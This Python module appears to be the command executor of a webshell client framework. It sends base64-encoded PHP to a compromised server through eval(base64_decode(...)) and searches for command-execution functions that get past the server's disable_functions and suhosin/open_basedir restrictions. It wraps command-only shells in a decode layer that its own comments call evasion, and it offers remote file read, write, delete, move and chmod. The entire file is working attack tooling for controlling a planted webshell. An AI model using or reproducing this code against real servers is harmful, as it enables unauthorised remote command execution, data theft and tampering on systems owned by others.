"""Execute PHP code and OS commands through a :class:`Transport`.

Two responsibilities:

* **PHP code execution** — wrap the payload between two random sentinels,
  base64-encode the whole thing and ``eval(base64_decode(...))`` it on the
  server.  base64 is what makes this robust: arbitrary quotes, newlines and
  binary in the payload survive transport untouched, which is exactly the
  injection/quoting class of bug that plagued v1's naive string interpolation.

* **Command execution** — pick a command-execution function that is *not* in
  the target's ``disable_functions`` list and fall back through the rest.  v1
  detected disabled functions but then always called ``system()`` anyway; this
  closes that gap.
"""

from __future__ import annotations

import base64
import shlex

from ..encoders import ByteTransform, get_transform
from ..exceptions import ExecutionFailed, NoExecFunction, WebshellError
from ..utils.strings import random_token
from .backends import Backend, PHPBackend
from .channel import Channel


class Executor:
    def __init__(
        self,
        transport: Channel,
        transform: ByteTransform | None = None,
        backend: Backend | None = None,
    ):
        self.transport = transport
        self.backend = backend or PHPBackend()
        self._transform = transform or get_transform("base64")
        self._disabled: set[str] | None = None
        self._exec_function: str | None = None

    @staticmethod
    def _b64(data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    def _extract(self, body: str, token: str) -> str:
        parts = body.split(token)
        if len(parts) < 3:
            raise ExecutionFailed(
                "Sentinel not found in response — the payload likely errored out."
            )
        return parts[1]

    def run_php(self, code: str) -> str:
        """Run a snippet of target-language code and return whatever it prints.

        ``code`` is a sequence of statements *without* a trailing terminator
        (the backend's sentinel adds one). Only available on eval-capable
        backends.
        """
        if not self.backend.supports_eval:
            raise ExecutionFailed(f"the {self.backend.name} backend cannot evaluate code")
        token = random_token()
        code = code.strip().rstrip(";")
        wrapped = self.backend.sentinel(token, code)
        payload = self.backend.wrap_eval(self._transform.apply(wrapped.encode()))
        body = self.transport.send(payload)
        return self._extract(body, token)

    @property
    def disabled_functions(self) -> set[str]:
        if self._disabled is None:
            code = self.backend.disabled_functions_code()
            if code is None:
                self._disabled = set()
            else:
                raw = self.run_php(code).strip()
                self._disabled = {f.strip() for f in raw.split(",") if f.strip()}
        return self._disabled

    def pick_exec_function(self) -> str:
        """Return the first command-exec function that isn't disabled."""
        builders = self.backend.command_builders()
        if self._exec_function is not None:
            return self._exec_function
        for name in builders:
            if name not in self.disabled_functions:
                self._exec_function = name
                return name
        raise NoExecFunction(
            "Every known command-execution function is disabled: " + ", ".join(sorted(builders))
        )

    def _resolve_exec_function(self) -> str:
        """Pick a command-exec function that actually produces output.

        Probes each non-disabled candidate with a tiny ``echo`` and returns the
        first that echoes back — catching functions that are listed-enabled but
        silently neutered (suhosin/open_basedir). If none echo (inconclusive),
        falls back to the first non-disabled candidate.
        """
        builders = self.backend.command_builders()
        if self._exec_function is not None:
            return self._exec_function
        candidates = [name for name in builders if name not in self.disabled_functions]
        if not candidates:
            raise NoExecFunction(
                "Every known command-execution function is disabled: "
                + ", ".join(sorted(builders))
            )
        token = random_token(8)
        probe = self._b64(f"echo {token}")
        for name in candidates:
            try:
                if token in self.run_php(builders[name](probe)):
                    self._exec_function = name
                    return name
            except WebshellError:
                continue
        self._exec_function = candidates[0]
        return self._exec_function

    def run_command(self, command: str) -> str:
        """Run an OS command (stderr merged into stdout) and return its output."""
        if not self.backend.supports_eval:
            # Command shell: the parameter *is* a shell command; sentinel-wrap it
            # then run it through the backend's decode wrapper (evasion).
            token = random_token()
            script = self.backend.sentinel(token, f"{command} 2>&1")
            wire = self.backend.wrap_command(self._transform.apply(script.encode()))
            body = self.transport.send(wire)
            return self._extract(body, token)
        function = self._resolve_exec_function()
        b64 = self._b64(f"{command} 2>&1")
        return self.run_php(self.backend.command_builders()[function](b64))

    # -- filesystem primitives -------------------------------------------------
    # Language-agnostic file operations: prefer the backend's evaluated-code
    # form; when the backend can't express it (e.g. a command-only shell), fall
    # back to a POSIX-shell command. Features call these instead of emitting
    # raw PHP, so ``features/files.py`` works on every backend.

    def fs_read_text(self, path: str) -> str:
        code = self.backend.read_text_code(path)
        if code is not None:
            return self.run_php(code)
        return self.run_command(f"cat -- {shlex.quote(path)}")

    def fs_read_bytes(self, path: str) -> bytes:
        code = self.backend.read_b64_code(path)
        raw = self.run_php(code) if code is not None else self.run_command(
            f"base64 {shlex.quote(path)}"
        )
        return base64.b64decode(raw)

    def fs_read_range(self, path: str, offset: int, length: int) -> bytes:
        code = self.backend.read_range_code(path, offset, length)
        if code is not None:
            raw = self.run_php(code)
        else:
            raw = self.run_command(
                f"tail -c +{offset + 1} {shlex.quote(path)} | head -c {length} | base64"
            )
        return base64.b64decode(raw)

    def fs_size(self, path: str) -> int:
        code = self.backend.size_code(path)
        raw = self.run_php(code) if code is not None else self.run_command(
            f"wc -c < {shlex.quote(path)}"
        )
        try:
            return int(raw.strip())
        except ValueError:
            return -1

    def fs_md5(self, path: str) -> str:
        code = self.backend.md5_code(path)
        if code is not None:
            return self.run_php(code).strip()
        out = self.run_command(f"md5sum {shlex.quote(path)}").split()
        return out[0] if out else ""

    def fs_exists(self, path: str) -> bool:
        code = self.backend.exists_code(path)
        raw = self.run_php(code) if code is not None else self.run_command(
            f"[ -e {shlex.quote(path)} ] && echo 1 || echo 0"
        )
        return raw.strip() == "1"

    def fs_is_dir(self, path: str) -> bool:
        code = self.backend.is_dir_code(path)
        raw = self.run_php(code) if code is not None else self.run_command(
            f"[ -d {shlex.quote(path)} ] && echo 1 || echo 0"
        )
        return raw.strip() == "1"

    def fs_write(self, path: str, data: bytes) -> bool:
        b64 = base64.b64encode(data).decode()
        code = self.backend.write_code(path, b64)
        if code is not None:
            return "OK" in self.run_php(code)
        return "OK" in self.run_command(
            f"echo {b64} | base64 -d > {shlex.quote(path)} && echo OK || echo FAIL"
        )

    def fs_delete(self, path: str | None) -> bool:
        code = self.backend.delete_code(path)
        if code is not None:
            return "OK" in self.run_php(code)
        if not path:  # command shells have no __FILE__ self-reference
            return False
        return "OK" in self.run_command(
            f"rm -f -- {shlex.quote(path)} && echo OK || echo FAIL"
        )

    def fs_move(self, src: str, dst: str) -> bool:
        code = self.backend.move_code(src, dst)
        if code is not None:
            return "OK" in self.run_php(code)
        return "OK" in self.run_command(
            f"mv -- {shlex.quote(src)} {shlex.quote(dst)} && echo OK || echo FAIL"
        )

    def fs_copy(self, src: str, dst: str) -> bool:
        code = self.backend.copy_code(src, dst)
        if code is not None:
            return "OK" in self.run_php(code)
        return "OK" in self.run_command(
            f"cp -- {shlex.quote(src)} {shlex.quote(dst)} && echo OK || echo FAIL"
        )

    def fs_mkdir(self, path: str) -> bool:
        code = self.backend.mkdir_code(path)
        if code is not None:
            return "OK" in self.run_php(code)
        return "OK" in self.run_command(
            f"mkdir -p -- {shlex.quote(path)} && echo OK || echo FAIL"
        )

    def fs_chmod(self, path: str, mode: str) -> bool:
        if not mode.isdigit():
            raise ValueError("mode must be octal digits, e.g. 755")
        code = self.backend.chmod_code(path, mode)
        if code is not None:
            return "OK" in self.run_php(code)
        return "OK" in self.run_command(
            f"chmod {mode} -- {shlex.quote(path)} && echo OK || echo FAIL"
        )

    def fs_list(self, path: str) -> list[tuple[str, int, str, int, str]]:
        """List a directory as ``(name, size, octal-perm, mtime, type)`` rows."""
        code = self.backend.list_dir_code(path)
        if code is not None:
            raw = self.run_php(code)
        else:
            raw = self.run_command(
                f"find {shlex.quote(path)} -maxdepth 1 -mindepth 1 "
                r"-printf '%f\037%s\037%m\037%T@\037%y\036' 2>/dev/null"
            )
        rows: list[tuple[str, int, str, int, str]] = []
        for row in raw.split("\x1e"):
            parts = row.split("\x1f")
            if len(parts) < 5:
                continue
            name, size, mode, mtime, kind = parts[:5]
            rows.append(
                (
                    name,
                    int(size or 0),
                    mode or "0",
                    int(float(mtime or 0)),
                    "d" if kind == "d" else "-",
                )
            )
        return rows
